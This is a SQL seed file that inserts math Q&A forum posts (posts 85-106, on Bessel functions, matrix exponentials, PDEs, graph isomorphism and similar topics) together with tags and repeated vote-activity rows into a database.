INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 0, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (85, 10, 'See &lt;a href=&quot;https://github.com/stavro/arc#url-generation&quot; rel=&quot;nofollow noreferrer&quot;&gt;arc docs&lt;/a&gt;. It is the same for view and controller.');
INSERT INTO answercomment (post_id, answer_id) VALUES (85, 46);
INSERT INTO activity (post_id, user_id, action) VALUES (85, 10, 'Create');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 0, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (86, 38, 'thanks. how can I get a path/url of an image from a) controller b) view?');
INSERT INTO answercomment (post_id, answer_id) VALUES (86, 46);
INSERT INTO activity (post_id, user_id, action) VALUES (86, 38, 'Create');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 0, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (87, 16, '&lt;p&gt;&lt;a href=&quot;https://i.stack.imgur.com/Frb5S.jpg&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;img src=&quot;https://i.stack.imgur.com/Frb5S.jpg&quot; alt=&quot;enter image description here&quot;&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;I got n(A)=15 , and n(B)=7 .&lt;/p&gt;

&lt;p&gt;But could not understand how to find number of relations&lt;/p&gt;
');
INSERT INTO question (post_id, topic_id, title) VALUES (87, 2, 'Total number of relation');
INSERT INTO activity (post_content_id, post_id, user_id, action) VALUES (87, 87, 16, 'Create');
INSERT INTO tag (text) VALUES ('functions');
INSERT INTO questiontag (question_id, tag_id) VALUES (87, 83);

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 0, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (88, 21, '&lt;p&gt;x is unknown, and I have the values of Bessel Function I Series like $J_0^2(x), J_1^2(x),..,J_n^2(x)$, how can I derive the value of x? &lt;/p&gt;
');
INSERT INTO question (post_id, topic_id, title) VALUES (88, 2, 'how to find the value of x when I have the values of Bessel Function I like $J_n^2(x)$?');
INSERT INTO activity (post_content_id, post_id, user_id, action) VALUES (88, 88, 21, 'Create');
INSERT INTO tag (text) VALUES ('functional-analysis');
INSERT INTO questiontag (question_id, tag_id) VALUES (88, 84);
INSERT INTO questiontag (question_id, tag_id) VALUES (88, 83);
INSERT INTO tag (text) VALUES ('bessel-functions');
INSERT INTO questiontag (question_id, tag_id) VALUES (88, 85);

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 0, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (89, 7, '&lt;p&gt;It seems that there is no way of computing&lt;/p&gt;

&lt;p&gt;$$ \lVert e^{tA}\lVert $$&lt;/p&gt;

&lt;p&gt;for an arbitrary real square matrix $A$ and any matrix norm $\lVert\cdot\lVert$, in terms of $t \in \mathbb{R}$ and $\lVert A \lVert$, i.e.&lt;/p&gt;

&lt;p&gt;$$f:(t,\lVert A \lVert ) \mapsto \lVert e^{tA}\lVert$$&lt;/p&gt;

&lt;p&gt;without explicitly performing the matrix exponential (exactly or approximately). Is that right?&lt;/p&gt;

&lt;p&gt;Because so far I could only find upper-bound estimates. If this problem in its full generality is not solved, can anyone say something about its solvability?&lt;/p&gt;

&lt;p&gt;For my particular case it would suffice to restrict to the case&lt;/p&gt;

&lt;p&gt;$$A=A^\mathrm{T}, \quad \mathrm{tr}(A) = 0$$
meaning $\left(e^A\right)^\mathrm{T} = e^A$ and $\det(e^A) = 1$.&lt;/p&gt;

&lt;p&gt;Thanks for any suggestions.&lt;/p&gt;
');
INSERT INTO question (post_id, topic_id, title) VALUES (89, 2, 'Exact norm of matrix exponential');
INSERT INTO activity (post_content_id, post_id, user_id, action) VALUES (89, 89, 7, 'Create');
INSERT INTO tag (text) VALUES ('linear-algebra');
INSERT INTO questiontag (question_id, tag_id) VALUES (89, 86);
INSERT INTO tag (text) VALUES ('matrices');
INSERT INTO questiontag (question_id, tag_id) VALUES (89, 87);
INSERT INTO tag (text) VALUES ('norm');
INSERT INTO questiontag (question_id, tag_id) VALUES (89, 88);
INSERT INTO tag (text) VALUES ('matrix-calculus');
INSERT INTO questiontag (question_id, tag_id) VALUES (89, 89);

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 0, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (90, 43, '&lt;p&gt;Solve the wave equation $u_{tt}=c^2u_{xx}$ with the boundary conditions $u(0,t)=0 $ and $u_x(l,t)=0$ as well the the initial data $u(x,0)=x$ and $u_t(x,0)=0$.&lt;/p&gt;

&lt;p&gt;I have solved this question and would like to have my answer checked here to see if it is correct (or if there&#x27;s any easier method to do this question.)&lt;/p&gt;

&lt;p&gt;To start off, we assume the form $u(x,t)=X(x)T(t)$. Then by separation of variables we obtain $X&#x27;&#x27;(x)+{\lambda}X(x)=0{\Rightarrow}X(x)=Acos{\beta}x+Bsin{\beta}x$ where ${\lambda=\beta^2}$.&lt;/p&gt;

&lt;p&gt;Now $X(0)=0{\Rightarrow}A=0$ and so $X(x)=Bsin{\beta}x$&lt;/p&gt;

&lt;p&gt;Then $X&#x27;(l)=0{\Rightarrow}B{\beta}cos{\beta}x=0$ and from here we gather that ${\beta_n=\frac{(n+\frac{1}{2}){\pi}}{l}}$ where $n=0,1,2, ...$&lt;/p&gt;

&lt;p&gt;Now for ${T&#x27;&#x27;(t)+ \lambda c^2T(t)=0 \Rightarrow T(t)=Ccos\beta ct + D sin \beta ct}$.&lt;/p&gt;

&lt;p&gt;Putting our results together we get: &lt;/p&gt;

&lt;p&gt;$u(x,t)=\sum_{n=0}^\infty (P_ncos \frac{(n+ \frac{1}{2})\pi ct}{l} + Q_nsin \frac{(n+ \frac{1}{2})\pi ct}{l})sin \frac{(n+\frac{1}{2})\pi x}{l}$&lt;/p&gt;

&lt;p&gt;Using $u(x,0)=x$ we get $\sum_{n=0}^\infty P_nsin \frac{(n+\frac{1}{2})\pi x}{l}=0$ and using the orthogonality relations we get $P_n= \frac{l^2}{(n+ \frac{1}{2})^2 \pi^2}(-1)^n$&lt;/p&gt;

&lt;p&gt;Using $u_t(x,0)=0$ we have $Q_n=0$ for all $n$ and so we have:&lt;/p&gt;

&lt;p&gt;$u(x,t)=\sum_{n=0}^\infty \frac{l^2}{(n+ \frac{1}{2})^2 \pi^2}(-1)^ncos \frac{(n+ \frac{1}{2})\pi ct}{l} sin \frac{(n+\frac{1}{2})\pi x}{l}$ as the final answer. &lt;/p&gt;

&lt;p&gt;Do kindly advice if I&#x27;ve made any conceptual errors in the working. Thank you very much. &lt;/p&gt;
');
INSERT INTO question (post_id, topic_id, title) VALUES (90, 2, 'Solving wave equation with inhomogeneous BCs');
INSERT INTO activity (post_content_id, post_id, user_id, action) VALUES (90, 90, 43, 'Create');
INSERT INTO tag (text) VALUES ('pde');
INSERT INTO questiontag (question_id, tag_id) VALUES (90, 90);

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 0, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (91, 44, '&lt;p&gt;Let me first state the problem first&lt;/p&gt;

&lt;p&gt;Let $X$ and $X&#x27;$ be two $n$-vertex graphs with adjacency matrices $A$ and $B$ respectively . &lt;strong&gt;An $n \times n $ permutation matrix $P$ encodes an isomorphism $\pi$ from $X$ to $X&#x27;$ if and only if $P$ is a solution to the following $0$-$1$ integer linear program&lt;/strong&gt;:
$$AP =BP$$
$$ \sum_{i=1}^{n}{P_{ij} = 1}, 1\le j\le n$$
$$ \sum_{j=1}^{n}{P_{ij} = 1}, 1\le i\le n$$
$${P_{ij}} \in \{0,1\}, 1 \le i,j\le n. $$&lt;/p&gt;

&lt;p&gt;I need to prove the claim in the bolded text.&lt;/p&gt;
');
INSERT INTO question (post_id, topic_id, title) VALUES (91, 2, 'Graph Isomorphism and Integer Linear Programming');
INSERT INTO activity (post_content_id, post_id, user_id, action) VALUES (91, 91, 44, 'Create');
INSERT INTO tag (text) VALUES ('graph-isomorphism');
INSERT INTO questiontag (question_id, tag_id) VALUES (91, 91);

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 0, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (92, 45, '&lt;p&gt;Let $f : X \to Y$ is finite morphism between integral porjective schemes under field $k$ of same dimension, and $\mathcal{F} \in \mathbf{Coh}(X)$. Is it true that $H^n(\mathcal{F})=H^n(f_*\mathcal{F})$.&lt;/p&gt;
');
INSERT INTO question (post_id, topic_id, title) VALUES (92, 2, 'Is it true for finite morphism $f$ between integral projective schemes that $H^n(\mathcal{F})=H^n(f_* \mathcal{F})$?');
INSERT INTO activity (post_content_id, post_id, user_id, action) VALUES (92, 92, 45, 'Create');
INSERT INTO tag (text) VALUES ('algebraic-geometry');
INSERT INTO questiontag (question_id, tag_id) VALUES (92, 92);
INSERT INTO tag (text) VALUES ('sheaf-theory');
INSERT INTO questiontag (question_id, tag_id) VALUES (92, 93);
INSERT INTO tag (text) VALUES ('sheaf-cohomology');
INSERT INTO questiontag (question_id, tag_id) VALUES (92, 94);

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 0, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (93, 20, '&lt;p&gt;&lt;a href=&quot;https://i.stack.imgur.com/CvvTr.png&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;img src=&quot;https://i.stack.imgur.com/CvvTr.png&quot; alt=&quot;enter image description here&quot;&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;I could not understand how they got $T_{100}$ as 300 .&lt;/p&gt;

&lt;p&gt;Can anybody please explain me .&lt;/p&gt;
');
INSERT INTO question (post_id, topic_id, title) VALUES (93, 2, 'Characterstic of log');
INSERT INTO activity (post_content_id, post_id, user_id, action) VALUES (93, 93, 20, 'Create');
INSERT INTO tag (text) VALUES ('logarithms');
INSERT INTO questiontag (question_id, tag_id) VALUES (93, 95);

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', -1, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (94, 11, '&lt;p&gt;On a 10-key (0 to 9) keyboard, a 4-digit password has 10^4 possibilities or 10,000.  If you have to press four numbers and then enter, you might enter up to 10,000 times.&lt;/p&gt;

&lt;p&gt;However, what if you could enter numbers without pressing enter?  Then the following sequence:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;111122223333
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Gets 1 repeat 4, 2 repeat 4, etc.  but it also gets 1112, 1122, 1222, etc. etc.&lt;/p&gt;

&lt;p&gt;This is my first post on Math Stack and it may be wrong to say this but I&#x27;m not necessarily looking for the answer :) Moreso I am asking for suggestions on how to approach this and prove it.  Thanks&lt;/p&gt;
');
INSERT INTO question (post_id, topic_id, title) VALUES (94, 2, 'how to calculate the optimal string to match a pass sequence');
INSERT INTO activity (post_content_id, post_id, user_id, action) VALUES (94, 94, 11, 'Create');
INSERT INTO tag (text) VALUES ('probability');
INSERT INTO questiontag (question_id, tag_id) VALUES (94, 96);
INSERT INTO tag (text) VALUES ('sequences-and-series');
INSERT INTO questiontag (question_id, tag_id) VALUES (94, 97);
INSERT INTO tag (text) VALUES ('optimization');
INSERT INTO questiontag (question_id, tag_id) VALUES (94, 98);

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 0, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (95, 33, '&lt;p&gt;Apologies if my question is primitive. What is the physical interpretation of moment generating function for varying &#x27;t&#x27;? In almost all places I read about it, the $r^{th}$ moment about the origin is defined by taking the $r^{th}$ derivative and substituting $t=0$. The moment about any other location $m$ is defined as, &lt;/p&gt;

&lt;p&gt;$$E[e^{t(X-m)}]=e^{-tm}E[e^{tX}]$$&lt;/p&gt;

&lt;p&gt;but it is still evaluated at the origin. I can see the physical interpretation at a location $m$ being the mean, variance etc. around $m$, but what does it mean as $t$ varies, in terms of physical/statistical interpretation? Thanks a lot.&lt;/p&gt;
');
INSERT INTO question (post_id, topic_id, title) VALUES (95, 2, 'Interpretation of moment generating function as $t$ varies?');
INSERT INTO activity (post_content_id, post_id, user_id, action) VALUES (95, 95, 33, 'Create');
INSERT INTO tag (text) VALUES ('statistics');
INSERT INTO questiontag (question_id, tag_id) VALUES (95, 99);

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 56, 9);
INSERT INTO postinstance (post_id, user_id, description) VALUES (96, 28, '&lt;p&gt;This is more machine learning questions, but perhaps someone will be able to help. I would like to know what is the difference between regression and classification when we try to generate output for a training data set &lt;em&gt;x&lt;/em&gt;?&lt;/p&gt;
');
INSERT INTO question (post_id, topic_id, title) VALUES (96, 2, 'Regression vs Classification');
INSERT INTO activity (post_content_id, post_id, user_id, action) VALUES (96, 96, 28, 'Create');
INSERT INTO tag (text) VALUES ('regression');
INSERT INTO questiontag (question_id, tag_id) VALUES (96, 100);
INSERT INTO tag (text) VALUES ('machine-learning');
INSERT INTO questiontag (question_id, tag_id) VALUES (96, 101);
INSERT INTO activity (post_id, user_id, action) VALUES (96, 28, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (96, 28, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (96, 28, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (96, 28, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (96, 28, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (96, 28, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (96, 28, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (96, 28, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (96, 28, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (96, 28, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (96, 28, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (96, 28, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (96, 28, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (96, 28, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (96, 28, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (96, 28, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (96, 28, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (96, 28, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (96, 28, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (96, 28, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (96, 28, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (96, 28, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (96, 28, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (96, 28, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (96, 28, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (96, 28, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (96, 28, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (96, 28, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (96, 28, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (96, 28, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (96, 28, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (96, 28, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (96, 28, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (96, 28, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (96, 28, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (96, 28, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (96, 28, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (96, 28, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (96, 28, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (96, 28, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (96, 28, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (96, 28, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (96, 28, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (96, 28, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (96, 28, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (96, 28, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (96, 28, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (96, 28, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (96, 28, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (96, 28, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (96, 28, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (96, 28, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (96, 28, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (96, 28, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (96, 28, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (96, 28, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (96, 28, 'Downvote');
INSERT INTO activity (post_id, user_id, action) VALUES (96, 28, 'Downvote');
INSERT INTO activity (post_id, user_id, action) VALUES (96, 28, 'Downvote');
INSERT INTO activity (post_id, user_id, action) VALUES (96, 28, 'Downvote');
INSERT INTO activity (post_id, user_id, action) VALUES (96, 28, 'Downvote');
INSERT INTO activity (post_id, user_id, action) VALUES (96, 28, 'Downvote');
INSERT INTO activity (post_id, user_id, action) VALUES (96, 28, 'Downvote');
INSERT INTO activity (post_id, user_id, action) VALUES (96, 28, 'Downvote');
INSERT INTO activity (post_id, user_id, action) VALUES (96, 28, 'Downvote');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 1, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (97, 45, '&lt;p&gt;How do you find a particular solution for this ODE?&lt;/p&gt;

&lt;p&gt;$\frac{d^2x(t)}{dt^2}= -\omega^2x(t)-\nu \frac{dx(t)}{dt}+f_0cos(\Omega t)$&lt;/p&gt;

&lt;p&gt;I know it&#x27;s of the form $x(t)=Acos(\Omega t)+Bsin(\Omega t)$ but I can&#x27;t find expression for A or B.&lt;/p&gt;
');
INSERT INTO question (post_id, topic_id, title) VALUES (97, 2, 'particular solution for 2nd order ODE');
INSERT INTO activity (post_content_id, post_id, user_id, action) VALUES (97, 97, 45, 'Create');
INSERT INTO tag (text) VALUES ('differential-equations');
INSERT INTO questiontag (question_id, tag_id) VALUES (97, 102);
INSERT INTO activity (post_id, user_id, action) VALUES (97, 45, 'Upvote');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 0, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (98, 17, '&lt;blockquote&gt;
  &lt;p&gt;A vector field $V$ has the divergence $div(V)=4$. &lt;/p&gt;
  
  &lt;p&gt;What is the total flux in through the surface $\partial C$ of a massive rotating cylinder $C$ that has the height $h=2$ and the radius $r=5$?&lt;/p&gt;
&lt;/blockquote&gt;

&lt;hr&gt;

&lt;p&gt;My parameterization is:&lt;/p&gt;

&lt;p&gt;$$r(u,v)=(5\cos v,5\sin v,u)$$&lt;/p&gt;

&lt;p&gt;The normal vector to the cylinder I&#x27;ve calculated is:&lt;/p&gt;

&lt;p&gt;$$\vec{n}=(-5\cos v,-5\sin v,0)$$&lt;/p&gt;

&lt;p&gt;I don&#x27;t know where to go from here. I&#x27;d appreciate your help.&lt;/p&gt;
');
INSERT INTO question (post_id, topic_id, title) VALUES (98, 2, 'Flux through rotating cylinder using divergence theorem');
INSERT INTO activity (post_content_id, post_id, user_id, action) VALUES (98, 98, 17, 'Create');
INSERT INTO tag (text) VALUES ('surface-integrals');
INSERT INTO questiontag (question_id, tag_id) VALUES (98, 103);

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 0, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (99, 15, '&lt;p&gt;How would one differentiate a function in this form?&lt;/p&gt;

&lt;p&gt;$$f(x) = f(a)+{\frac {f&#x27;(a)}{1!}}(x-a)+{\frac {f&#x27;&#x27;(a)}{2!}}(x-a)^{2}+{\frac {f&#x27;&#x27;&#x27;(a)}{3!}}(x-a)^{3}$$&lt;/p&gt;

&lt;p&gt;I&#x27;m sorry if this is something obvious, I&#x27;m not great with maths. I tried searching for the answer with no luck.&lt;/p&gt;
');
INSERT INTO question (post_id, topic_id, title) VALUES (99, 2, 'Find derivative of Taylor series');
INSERT INTO activity (post_content_id, post_id, user_id, action) VALUES (99, 99, 15, 'Create');
INSERT INTO tag (text) VALUES ('derivatives');
INSERT INTO questiontag (question_id, tag_id) VALUES (99, 104);
INSERT INTO tag (text) VALUES ('taylor-expansion');
INSERT INTO questiontag (question_id, tag_id) VALUES (99, 105);

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 0, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (100, 32, '&lt;p&gt;let $f(x) =(\sqrt x + \sqrt{x+1})x$&lt;/p&gt;

&lt;p&gt;This function exist at right hand limit at point 0 .&lt;/p&gt;

&lt;p&gt;So can we say it continous or discontinous at point 0.&lt;/p&gt;
');
INSERT INTO question (post_id, topic_id, title) VALUES (100, 2, 'Continous or discontinous function');
INSERT INTO activity (post_content_id, post_id, user_id, action) VALUES (100, 100, 32, 'Create');
INSERT INTO questiontag (question_id, tag_id) VALUES (100, 83);

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 0, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (101, 45, '&lt;p&gt;&lt;a href=&quot;https://i.stack.imgur.com/cttO6.png&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;img src=&quot;https://i.stack.imgur.com/cttO6.png&quot; alt=&quot;enter image description here&quot;&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;In the solution given how they got the circled term .&lt;/p&gt;

&lt;p&gt;I could nt understand that .&lt;/p&gt;
');
INSERT INTO question (post_id, topic_id, title) VALUES (101, 2, 'Infiite sum of trignometry series .');
INSERT INTO activity (post_content_id, post_id, user_id, action) VALUES (101, 101, 45, 'Create');
INSERT INTO tag (text) VALUES ('trigonometry');
INSERT INTO questiontag (question_id, tag_id) VALUES (101, 106);

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 1, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (102, 27, '&lt;p&gt;I got a problem stated as H(z) is the z trasform of h[n], which is a real, stable, even, two sided sequence. H(z)=G(z)*G(z^-1), where g[n] is a causal, minimum phase signal. Shouldn&#x27;t the product of G(z) and its inverse equal to 1, the identity system? Did I miss out something?&lt;/p&gt;
');
INSERT INTO question (post_id, topic_id, title) VALUES (102, 2, 'Product of a minimum phase signal times its inverse');
INSERT INTO activity (post_content_id, post_id, user_id, action) VALUES (102, 102, 27, 'Create');
INSERT INTO tag (text) VALUES ('convolution');
INSERT INTO questiontag (question_id, tag_id) VALUES (102, 107);
INSERT INTO tag (text) VALUES ('signal-processing');
INSERT INTO questiontag (question_id, tag_id) VALUES (102, 108);
INSERT INTO tag (text) VALUES ('z-transform');
INSERT INTO questiontag (question_id, tag_id) VALUES (102, 109);
INSERT INTO activity (post_id, user_id, action) VALUES (102, 27, 'Upvote');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 0, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (103, 48, '&lt;p&gt;I am self studying Abbott&#x27;s understanding analysis I have a question about two exercises&lt;/p&gt;

&lt;p&gt;Exercise: 
Give an example of each of the following, or state that the request is impossible&lt;/p&gt;

&lt;p&gt;1) A set B with inf B ≥ Sup B    (I said that this is impossible)
2) A finite set that contains its infimum but not its supremum
For 2) I understand that I must make an example of a set containing the greatest lower bound, but does not contain a least upper bound, but i don&#x27;t know how to proceed.&lt;/p&gt;

&lt;p&gt;Thanks&lt;/p&gt;
');
INSERT INTO question (post_id, topic_id, title) VALUES (103, 2, 'Analysis / upper lower bound');
INSERT INTO activity (post_content_id, post_id, user_id, action) VALUES (103, 103, 48, 'Create');
INSERT INTO tag (text) VALUES ('analysis');
INSERT INTO questiontag (question_id, tag_id) VALUES (103, 110);
INSERT INTO tag (text) VALUES ('elementary-set-theory');
INSERT INTO questiontag (question_id, tag_id) VALUES (103, 111);

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 0, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (104, 13, '&lt;blockquote&gt;
  &lt;p&gt;If $A\cup B=A\cup C$ and $A\cap B=A\cap C$, prove that $B=C$.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;strong&gt;My attempt:&lt;/strong&gt;
$$A\cup B= A\cup C$$
$$n(A\cup B)=n(A\cup C)$$
$$n(A)+n(B)-n(A\cap B)=n(A)+n(C)-n(A\cap C)$$
$$n(B)=n(C)$$
$$B=C$$.&lt;/p&gt;

&lt;p&gt;Is this correct?Or, do we have any other alternatives?&lt;/p&gt;
');
INSERT INTO question (post_id, topic_id, title) VALUES (104, 2, 'If $A\cup B=A\cup C$ and $A\cap B= A\cap C$, prove that: $B=C$');
INSERT INTO activity (post_content_id, post_id, user_id, action) VALUES (104, 104, 13, 'Create');
INSERT INTO questiontag (question_id, tag_id) VALUES (104, 111);
INSERT INTO tag (text) VALUES ('proof-verification');
INSERT INTO questiontag (question_id, tag_id) VALUES (104, 112);

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 0, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (105, 13, '&lt;p&gt;If $\alpha \in (0,1)$ is an irrational number, the question is to show that &lt;/p&gt;

&lt;p&gt;\begin{equation}
\alpha = \sum_{n=0}^{\infty} \frac{(-1)^n}{q_nq_{n-1}}
\end{equation}&lt;/p&gt;

&lt;p&gt;(where $q_n$ denotes the denominator of the n$^{th}$ partial quotient of $\alpha$).&lt;/p&gt;

&lt;p&gt;What I have tried to use is that if:&lt;/p&gt;

&lt;p&gt;\begin{equation}
p_nq_{n-1} - q_np_{n-1} = (-1)^{n+1}\\
\frac{p_nq_{n-1}}{q_n} - p_{n-1} = \frac{(-1)^{n+1}}{q_n}\\
\frac{p_n}{q_n} - \frac{p_{n-1}}{q_{n-1}} = \frac{(-1)^{n+1}}{q_nq_{n-1}}\\
\end{equation}&lt;/p&gt;

&lt;p&gt;Since, by definition, $\alpha = \lim_{n\rightarrow \infty}\frac{p_n}{q_n}$, it looks like it could be a telescopic series using what I have calculated. Does anyone know if I&#x27;m on the right track here?&lt;/p&gt;

&lt;p&gt;Update: For example, if I re-write the equation above;&lt;/p&gt;

&lt;p&gt;\begin{equation}
\frac{p_n}{q_n} = \frac{(-1)^{n+1}}{q_nq_{n-1}} + \frac{p_{n-1}}{p_{n-1}}\\
\frac{p_n}{q_n} = \frac{(-1)^{n+1}}{q_nq_{n-1}} + \frac{(-1)^n}{q_{n-1}q_{n-2}} + \frac{p_{n-2}}{q_{n-3}}\\
\end{equation}&lt;/p&gt;
');
INSERT INTO question (post_id, topic_id, title) VALUES (105, 2, 'If $\alpha \in (0,1)$ is an irrational number, show that $\alpha = \sum_{n=0}^{\infty} \frac{(-1)^n}{q_{n+1}q_{n}}$');
INSERT INTO activity (post_content_id, post_id, user_id, action) VALUES (105, 105, 13, 'Create');
INSERT INTO tag (text) VALUES ('convergence');
INSERT INTO questiontag (question_id, tag_id) VALUES (105, 113);
INSERT INTO tag (text) VALUES ('summation');
INSERT INTO questiontag (question_id, tag_id) VALUES (105, 114);

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 4, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (106, 6, '&lt;p&gt;I am trying to solve this problem:&lt;/p&gt;

&lt;h2&gt;&lt;a href=&quot;https://i.stack.imgur.com/QlSkj.png&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;img src=&quot;https://i.stack.imgur.com/QlSkj.png&quot; alt=&quot;enter image description here&quot;&gt;&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;There is a hint saying that I can use the fact that for 
$$X=a_i\frac{\partial }{\partial x_i}\text{ with } a_i\in C^\infty(U)$$
and
$$Y=b_i\frac{\partial }{\partial x_i}\text{ with } b_i\in C^\infty(U)$$
we have
$$[X,Y]=\left(a_{i}\frac{\partial b_{j}}{\partial x_{i}}-b_{i}\frac{\partial a_{j}}{\partial x_{i}}\right)\frac{\partial}{\partial x_{j}}
 $$&lt;/p&gt;

&lt;p&gt;But I did not manage to use this hint in any useful way. Also, the obvious procedure seems to be the following:
$$\Psi([X,Y])(P)=P[X,Y]=P(XY-YX)=PXY-PYX$$
and
$$[\Psi(X),\Psi(Y)](P)=\left(\Psi(X)\Psi(Y)-\Psi(Y)\Psi(X)\right)(P)\\=\Psi(X)\left(\Psi(Y)(P)\right)-\Psi(Y)\left(\Psi(X)(P)\right)=\Psi(X)\left(PY\right)-\Psi(Y)\left(PX\right)=PYX-PXY$$&lt;/p&gt;

&lt;p&gt;And this is clearly wrong. So:&lt;/p&gt;

&lt;p&gt;1) What did I miss in my attempt?&lt;br&gt;
2) Any hints on solving this using the given hint?&lt;/p&gt;

&lt;hr&gt;

&lt;p&gt;&lt;strong&gt;EDIT:&lt;/strong&gt; I believe I can solve this using the hint if $[\tilde{X},\tilde{Y}](P)=[\tilde{X}(P),\tilde{Y}(P)]$. However, I do not know why/if this is true, and question 1) still holds.&lt;/p&gt;
');
INSERT INTO question (post_id, topic_id, title) VALUES (106, 2, 'A little problem on Lie Brackets relating it with the commutator of matrices');
